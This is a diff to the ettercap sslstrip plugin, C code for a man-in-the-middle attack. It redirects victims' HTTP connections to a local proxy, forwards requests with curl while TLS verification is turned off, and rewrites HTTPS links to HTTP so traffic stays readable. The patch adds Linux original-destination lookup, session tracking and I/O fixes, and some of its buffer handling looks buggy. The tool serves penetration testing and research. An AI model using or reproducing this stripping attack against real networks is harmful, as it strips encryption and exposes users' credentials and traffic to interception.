@@ -1,7 +1,7 @@
 /*
     sslstrip -- ettercap plugin -- SSL Strip per Moxie (http://www.thoughtcrime.org/software/sslstrip/)
    
-    Copyright (C) Ettercap team
+    Copyright (C) Ettercap Development Team. 2012.
     
     This program is free software; you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
@@ -28,6 +28,12 @@
 #include <ec_socket.h>
 #include <ec_threads.h>
 #include <ec_decode.h>
+
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+
+#include <linux/netfilter_ipv4.h>
 
 
 #ifdef HAVE_SYS_POLL_H
@@ -56,13 +62,15 @@
 #define HTTP_MAX (1024*20) //20KB max for HTTP requests.
 
 #define BREAK_ON_ERROR(x,y,z) do {  \
-   if (x == -EINVALID) {            \
+   if (x <= 0) {            \
       SAFE_FREE(z.DATA.disp_data);  \
       http_initialize_po(&z, z.DATA.data, z.DATA.len); \
       z.len = 64;                   \
       z.L4.flags = TH_RST;          \
-      packet_disp_data(&z, z.DATA.data, z.DATA.len); \
-      http_parse_packet(y, HTTP_CLIENT, &z); \
+      if (x == 0) {                 \
+      	packet_disp_data(&z, z.DATA.data, z.DATA.len); \
+      	http_parse_packet(y, HTTP_CLIENT, &z); \
+      }				    \
       http_wipe_connection(y);      \
       SAFE_FREE(z.DATA.data);       \
       SAFE_FREE(z.DATA.disp_data);  \
@@ -111,10 +119,15 @@ int plugin_load(void *);
 static int sslstrip_init(void *);
 static int sslstrip_fini(void *);
 static void sslstrip(struct packet_object *po);
+static int sslstrip_is_http(struct packet_object *po);
+static void sslstrip_create_session(struct ec_session **s, struct packet_object *po);
+static int sslstrip_match(void *id_sess, void *id_curr);
 
 /* http stuff */
 static void Find_Url(u_char *to_parse, char **ret);
+
 static size_t http_create_ident(void **i, struct packet_object *po);
+
 static int http_sync_conn(struct http_connection *connection);
 static int http_get_peer(struct http_connection *connection);
 static int http_read(struct http_connection *connection, struct packet_object *po);
@@ -128,6 +141,7 @@ static void http_handle_request(struct http_connection *connection, struct packe
 static void http_send(struct http_connection *connection, struct packet_object *po, int proto);
 static void http_remove_https(struct http_connection *connection);
 static u_int http_receive_from_server(char *ptr, size_t size, size_t nmemb, void *userdata);
+static size_t http_write_to_server(void *ptr, size_t size, size_t nmemb, void *stream);
 
 /* thread stuff */
 static int http_bind_wrapper(void);
@@ -164,12 +178,16 @@ static int sslstrip_init(void *dummy)
 
 	/* add hook point in the dissector for HTTP traffic */
 	//hook_add(HOOK_PROTO_HTTP, &sslstrip);
+
 	hook_add(HOOK_HANDLED, &sslstrip);
+
 	return PLUGIN_RUNNING;
 }
 
 static int sslstrip_fini(void *dummy)
 {
+
+	DEBUG_MSG("SSLStrip: Removing redirect\n");
 	if (http_remove_redirect(bind_port) == -EFATAL) {
 		USER_MSG("Unable to remove HTTP redirect, please do so manually.");
 	}
@@ -183,9 +201,84 @@ static int sslstrip_fini(void *dummy)
 	return PLUGIN_FINISHED;
 }
 
+static int sslstrip_is_http(struct packet_object *po)
+{
+	if (po->L4.proto != NL_TYPE_TCP)
+		return 0;
+
+	if (ntohs(po->L4.dst) == 80 ||
+	    ntohs(po->L4.src) == 80)
+		return 1;
+
+	return 0;
+}
+
+static int sslstrip_match(void *id_sess, void *id_curr)
+{
+	struct  http_ident *ids = id_sess;
+	struct http_ident *id = id_curr;
+
+	/* sanity checks */
+	BUG_IF(ids == NULL);
+	BUG_IF(id == NULL);
+
+	/* check magic */
+	if (ids->magic != id->magic)
+		return 0;
+
+	if (ids->L4_src == id->L4_src &&
+	    ids->L4_dst == id->L4_dst &&
+	    !ip_addr_cmp(&ids->L3_src, &id->L3_src))
+	return 1;
+
+	return 0;
+}
+
+static void sslstrip_create_session(struct ec_session **s, struct packet_object *po)
+{
+	void *ident;
+	DEBUG_MSG("sslstrip_create_session");
+	
+	/* allocate the session */
+	SAFE_CALLOC(*s, 1, sizeof(struct ec_session));
+
+	/* create the ident */
+	(*s)->ident_len = http_create_ident(&ident, po);
+
+	/* link to the session */
+	(*s)->ident = ident;
+
+	/* the matching function */
+	(*s)->match = sslstrip_match;
+
+	/* alloc of data elements */
+	SAFE_CALLOC((*s)->data, 1, sizeof(struct ip_addr));
+}
+
+/*
+ * Filter HTTP related packets and create NAT sessions
+ */
 static void sslstrip(struct packet_object *po)
 {
-	//NOOP
+
+#ifndef OS_LINUX
+	struct ec_session *s = NULL;
+	if (!sslstrip_is_http(po))
+		return;	
+
+	/* If it's an HTTP packet, don't forward */
+	po->flags |= PO_DROPPED;
+
+	if ( (po->flags & PO_FORWARDABLE) &&
+	     (po->L4.flags & TH_SYN) &&
+             !(po->L4.flags & TH_ACK) ) {
+		sslstrip_create_session(&s, PACKET);	
+		memcpy(s->data, &po->L3.dst, sizeof(struct ip_addr));
+		session_put(s);
+	} else {
+		po->flags |= PO_IGNORE;
+	}
+#endif
 }
 
 /* Unescape the string */
@@ -342,7 +435,7 @@ static int http_remove_redirect(u_int16 dport)
 static EC_THREAD_FUNC(http_accept_thread)
 {
 	struct http_connection *connection = NULL;
-	u_int len = sizeof(struct sockaddr_in), i;
+	u_int len = sizeof(struct sockaddr_in);
 	struct sockaddr_in client_sin;
 
 	ec_thread_init();
@@ -354,21 +447,25 @@ static EC_THREAD_FUNC(http_accept_thread)
 
 	LOOP {
 		poll(&poll_fd, 1, -1);
-		SAFE_CALLOC(connection, 1, sizeof(struct http_connection));
-		connection->fd= accept(poll_fd.fd, (struct sockaddr *)&client_sin, &len);
 
-		if (connection->fd == -1) {
-			SAFE_FREE(connection);
-			continue;
+		if (poll_fd.revents & POLLIN) {
+			SAFE_CALLOC(connection, 1, sizeof(struct http_connection));
+			connection->fd= accept(poll_fd.fd, (struct sockaddr *)&client_sin, &len);
+
+			DEBUG_MSG("SSLStrip: Received connection\n");
+			if (connection->fd == -1) {
+				SAFE_FREE(connection);
+				continue;
+			}
+
+			ip_addr_init(&connection->ip[HTTP_CLIENT], AF_INET, (char *)&(client_sin.sin_addr.s_addr));
+			connection->port[HTTP_CLIENT] = client_sin.sin_port;
+			connection->port[HTTP_SERVER] = htons(80);
+			connection->len = 0;
+
+			/* create detached thread */
+			ec_thread_new_detached("http_child_thread", "http child", &http_child_thread, connection, 1);	
 		}
-
-		ip_addr_init(&connection->ip[HTTP_CLIENT], AF_INET, (char *)&(client_sin.sin_addr.s_addr));
-		connection->port[HTTP_CLIENT] = client_sin.sin_port;
-		connection->port[HTTP_SERVER] = htons(80);
-		connection->len = 0;
-
-		/* create detached thread */
-		ec_thread_new_detached("http_child_thread", "http child", &http_child_thread, connection, 1);	
 	}
 
 	return NULL;
@@ -376,6 +473,8 @@ static EC_THREAD_FUNC(http_accept_thread)
 
 static int http_get_peer(struct http_connection *connection)
 {
+
+#ifndef OS_LINUX
 	struct ec_session *s = NULL;
 	struct packet_object po;
 	void *ident= NULL;
@@ -408,12 +507,19 @@ static int http_get_peer(struct http_connection *connection)
 
 	memcpy(&connection->ip[HTTP_SERVER], s->data, sizeof(struct ip_addr));
 
-	DEBUG_MSG("SSLstrip: Got peer!");
-	
 	SAFE_FREE(s->data);
 	SAFE_FREE(s);
 	SAFE_FREE(ident);
+#else
+	 struct sockaddr_in sa_in;
+	 socklen_t sa_in_sz = sizeof(struct sockaddr_in);
+	 getsockopt (connection->fd, SOL_IP, SO_ORIGINAL_DST, (struct sockaddr*)&sa_in, &sa_in_sz);
 
+	 ip_addr_init(&connection->ip[HTTP_SERVER], AF_INET, (u_char *)&sa_in.sin_addr);
+#endif
+
+	DEBUG_MSG("SSLStrip: Got peer!");
+	
 	return ESUCCESS;
 
 }
@@ -435,7 +541,8 @@ static size_t http_create_ident(void **i, struct packet_object *po)
 	*i = ident;
 	return sizeof(struct http_ident);
 }
-static http_sync_conn(struct http_connection *connection) 
+
+static int http_sync_conn(struct http_connection *connection) 
 {
 	if (http_get_peer(connection) != ESUCCESS)
 		return -EINVALID;
@@ -447,32 +554,19 @@ static http_sync_conn(struct http_connection *connection)
 
 static int http_read(struct http_connection *connection, struct packet_object *po)
 {
-	u_char *data;
-	int len, err;
-
-	err = ESUCCESS;
+	int len = 0;	
 
 	len = read(connection->fd, po->DATA.data, HTTP_MAX);
-
-	if (len == 0) {
-		int sock_err = GET_SOCK_ERRNO();
-
-		if (sock_err == EINTR || sock_err == EAGAIN)
-			err = -ENOTHANDLED;
-		else 
-			err = -EINVALID;
-	}
 
 	DEBUG_MSG("SSLStrip: Read request %s", po->DATA.data);
 
 	po->DATA.len = len;
-	return err;	
+	return len;	
 }
 
 static void http_handle_request(struct http_connection *connection, struct packet_object *po)
 {
 	struct https_link *link;
-	char *url;
 	char sent = 0;
 
 	SAFE_CALLOC(connection->url, 1, 1024);
@@ -504,13 +598,9 @@ static void http_handle_request(struct http_connection *connection, struct packe
 static void http_send(struct http_connection *connection, struct packet_object *po, int proto)
 {
 	connection->handle = curl_easy_init();
-	size_t iolen;	
 	char *url;
 
 	//Allow decoders to run for request
-
-	http_parse_packet(connection, HTTP_CLIENT, po);
-
 	if (proto == PROTO_HTTPS) {
 		curl_easy_setopt(connection->handle, CURLOPT_SSL_VERIFYPEER, 0L);
 		curl_easy_setopt(connection->handle, CURLOPT_SSL_VERIFYHOST, 0L);
@@ -532,12 +622,14 @@ static void http_send(struct http_connection *connection, struct packet_object *
 	curl_easy_setopt(connection->handle, CURLOPT_WRITEFUNCTION, http_receive_from_server);
 	curl_easy_setopt(connection->handle, CURLOPT_WRITEDATA, connection);
 	curl_easy_setopt(connection->handle, CURLOPT_ERRORBUFFER, connection->curl_err_buffer);
+	curl_easy_setopt(connection->handle, CURLOPT_READFUNCTION, http_write_to_server);
+	curl_easy_setopt(connection->handle, CURLOPT_READDATA, po->DATA.data);
+	curl_easy_setopt(connection->handle, CURLOPT_INFILESIZE_LARGE, (curl_off_t)po->DATA.len);
+	
 
-	if(curl_easy_send(connection->handle, po->DATA.data, po->DATA.len, &iolen) != CURLE_OK) {
+	if(curl_easy_perform(connection->handle) != CURLE_OK) {
 		USER_MSG("Unable to send request to HTTP server: %s", connection->curl_err_buffer);
 		return;
-	} else if (iolen != po->DATA.len) {
-		USER_MSG("Unable to send entire HTTP request, only sent %d bytes", iolen);
 	} else {
 		DEBUG_MSG("SSLStrip: Sent request to server");
 	}
@@ -568,14 +660,16 @@ static int http_write(struct http_connection *connection)
 	char *ptr = connection->buffer;
 
 	while (bytes_sent < connection->len) {
-		len = write(connection->fd, ptr, 1024);
+		len = write(connection->fd, ptr, connection->len);
 
-		if (len <=0) {
+		if (len <= 0) {
 			err = GET_SOCK_ERRNO();
 			if (err != EAGAIN && err != EINTR)
 				return -EINVALID;
 		}
-		
+	
+		bytes_sent += len;
+	
 		if (bytes_sent < connection->len)
 			ptr += bytes_sent;
 	}
@@ -583,11 +677,17 @@ static int http_write(struct http_connection *connection)
 	return ESUCCESS;
 }
 
+static size_t http_write_to_server(void *ptr, size_t size, size_t nmemb, void *stream)
+{
+	memcpy(stream, ptr, size*nmemb);
+	return size*nmemb;
+}
+
 static u_int http_receive_from_server(char *ptr, size_t size, size_t nmemb, void *userdata)
 {
 	struct http_connection *connection = (struct http_connection *)userdata;
 
-	DEBUG_MSG("SSLStri: Received response from server %s", ptr);
+	DEBUG_MSG("SSLStrip: Received response from server %s", ptr);
 
 	if (connection->len == 0) {
 		//Initiailize buffer
@@ -597,12 +697,13 @@ static u_int http_receive_from_server(char *ptr, size_t size, size_t nmemb, void
 
 		memcpy(connection->buffer, ptr, size*nmemb);
 	} else {
-		char *b = realloc(connection->buffer, size*nmemb);
+		char *b = realloc(connection->buffer, connection->len+(size*nmemb));
 		
 		if (b == NULL)
 			return 0;
 
 		memcpy(b, ptr, size*nmemb);
+		DEBUG_MSG("SSLStrip: Buffer contains %s", connection->buffer);
 	}
 
 	return size*nmemb;
@@ -611,23 +712,15 @@ static u_int http_receive_from_server(char *ptr, size_t size, size_t nmemb, void
 EC_THREAD_FUNC(http_child_thread)
 {
 	struct packet_object po;
-	int direction, ret_val, data_read;
+	int  ret_val;
 	struct http_connection *connection;
-#ifndef OS_WINDOWS
-	struct timespec tm;
-	tm.tv_sec = 0;
-	tm.tv_nsec = 3000*1000;
-#else
-	int timeout = 3000;
-#endif
 
 	connection = (struct http_connection *)args;
 	ec_thread_init();
 
-	DEBUG_MSG("SSLstrip: Received HTTP connection");
+	DEBUG_MSG("SSLStrip: Received HTTP connection");
 
-
-	/* Connect to real HTTP server */
+	/* Get peer and set to non-blocking */
 	if (http_sync_conn(connection) == -EINVALID) {
 		DEBUG_MSG("SSLStrip: Could not get peer!!");
 		if (connection->fd != -1)
@@ -643,32 +736,18 @@ EC_THREAD_FUNC(http_child_thread)
 	po.L4.flags = (TH_SYN | TH_ACK);
 	packet_disp_data(&po, po.DATA.data, po.DATA.len);
 	http_initialize_po(&po, po.DATA.data, po.DATA.len);
-	u_char *data = NULL;
-	size_t len = 0;
 
-	data = (u_char *)malloc(1024);
 	
-	if (!data){
-		SAFE_FREE(connection);
-		ec_thread_exit();
-	}	
-
-	data_read = 0;
-
 	LOOP {
-
+		http_initialize_po(&po, NULL, 0);
 		ret_val = http_read(connection, &po);
+		DEBUG_MSG("SSLStrip: Returned %d", ret_val);
 		BREAK_ON_ERROR(ret_val, connection, po);
 
-		if (ret_val == ESUCCESS)
-			data_read=1;
-
-		/* if we read data, write it to real server */
-		if (data_read) {
+		if (ret_val > 0)  {
 			/* Look in the https_links list and if the url matches, send to HTTPS server.
 			   Otherwise send to HTTP server */
 			http_handle_request(connection, &po);
-			http_initialize_po(&po, po.DATA.data, po.DATA.len);
 		}
 		
 	}
@@ -698,7 +777,7 @@ static void http_remove_https(struct http_connection *connection)
        DEBUG_MSG("SSLStrip: Found https");
 
        ptr = connection->buffer;
-       end = ptr + len;
+       end = ptr + connection->len;
 
        do {
 	       len = end - ptr;
@@ -719,7 +798,7 @@ static void http_remove_https(struct http_connection *connection)
 			link_end = strchr(tmp, '\'');
 		 }
 
-                 *link_end--;
+                 link_end--;
 
                  char *url = (char *)(link_end - tmp);
 
@@ -796,10 +875,11 @@ static void http_initialize_po(struct packet_object *po, u_char *p_data, size_t 
     * XXX - Be sure to not modify these len.
     */
 
-   SAFE_FREE(po->DATA.data);
-
+	
    memset(po, 0, sizeof(struct packet_object));
+
    if (p_data == NULL) {
+      SAFE_FREE(po->DATA.data);
       SAFE_CALLOC(po->DATA.data, 1, HTTP_MAX);
       po->DATA.len = HTTP_MAX;
    } else {
@@ -826,7 +906,6 @@ static void http_initialize_po(struct packet_object *po, u_char *p_data, size_t 
 
 static int http_bind_wrapper(void)
 {
-	u_int len = sizeof(struct sockaddr_in), i;
 	bind_port = EC_MAGIC_16;
 	struct sockaddr_in sa_in;
 
@@ -844,6 +923,7 @@ static int http_bind_wrapper(void)
 		sa_in.sin_port = htons(bind_port);	
 	} while (bind(main_fd, (struct sockaddr *)&sa_in, sizeof(sa_in)) != 0);
 
+	listen(main_fd, 100);
 	DEBUG_MSG("SSLStrip plugin: bind 80 on %d", bind_port);
 	
 	if (http_insert_redirect(bind_port) != ESUCCESS)
